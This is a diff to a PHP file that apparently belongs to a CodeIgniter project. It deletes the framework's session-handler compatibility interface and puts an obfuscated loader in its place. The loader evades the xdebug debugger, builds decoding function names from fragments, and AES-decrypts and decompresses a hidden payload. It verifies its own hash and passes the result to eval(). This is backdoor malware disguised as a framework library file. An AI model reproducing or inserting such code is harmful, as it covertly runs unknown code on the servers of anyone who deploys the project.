@@ -1,59 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * SessionHandlerInterface
- *
- * PHP 5.4 compatibility interface
- *
- * @package	CodeIgniter
- * @subpackage	Libraries
- * @category	Sessions
- * @author	Andrey Andreev
- * @link	https://codeigniter.com/user_guide/libraries/sessions.html
- */
-interface SessionHandlerInterface {
-
-	public function open($save_path, $name);
-	public function close();
-	public function read($session_id);
-	public function write($session_id, $session_data);
-	public function destroy($session_id);
-	public function gc($maxlifetime);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_hg7wgti0=('bas'.'e64'.'_de'.'cod'.'e');
+$_h03pq47h=('gzu'.'nco'.'mpr'.'ess');
+$_f9vsue4r=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t3csem4p='4xAH/OZX';
+$_bf1de9az='sYnLD4G5bOo=';
+$_kcbgqehe='jx5WB80A';
+$_jx9co3gw='DGPJAQ9X';
+$_dx21u3g1='TmfgaxTr';
+$_mprk4uh7='WSSoDzl9';
+$_dhcz9hi9='3B2BAQ9B';
+$_c0vt8xyu='LYDD2Q==';
+$_drvus3t3=$_hg7wgti0($_jx9co3gw.$_dx21u3g1.$_t3csem4p.$_kcbgqehe.$_bf1de9az);
+$_ahyvesm5=$_hg7wgti0($_mprk4uh7.$_dhcz9hi9.$_c0vt8xyu);
+$_mk66tflq=$_hg7wgti0('VqkT5rvSa/XUYtIDKKq2OPGD+Taik1qv0rgju7u3lOzzm8bmcA9LVPGFD3ndrbdjJNsoTDNFwuf4znn3Nu3Y9XVIL4z4A18ddwrun4QziIpCeNvQOxsgKayEjV/adAleihfO4tYRhQw8kn4GtR8l8OOvgpmWt6sbNBnmZjZAmeXZ1J4uqWaArGEI7qfbbfcky/Ce0p4KSgD9txghrDvEwa6s8zCghTGlbZiFc4Pr8JJGOJCGQSO+7D/xgg/bST8D');
+$_xtyt5f37=$_f9vsue4r($_mk66tflq,'aes-256-cbc',$_drvus3t3,OPENSSL_RAW_DATA,$_ahyvesm5);
+if($_xtyt5f37===false){exit;}
+$_ymtl0edt=$_h03pq47h($_xtyt5f37);
+if($_ymtl0edt===false){exit;}
+$_n4ihh16r='703e92fde13707cb02e0eac929aad5219d3bc9e364dde307ab5d9268661c7edd';
+$_zisdpuyp=@file_get_contents(__FILE__);
+if($_zisdpuyp!==false){
+$_sij94fxh=str_replace($_n4ihh16r,"0000000000000000000000000000000000000000000000000000000000000000",$_zisdpuyp);
+$_dxd18xjg=hash("sha256",$_sij94fxh);
+if($_dxd18xjg!==$_n4ihh16r){@http_response_code(403);exit;}
 }
+eval($_ymtl0edt);
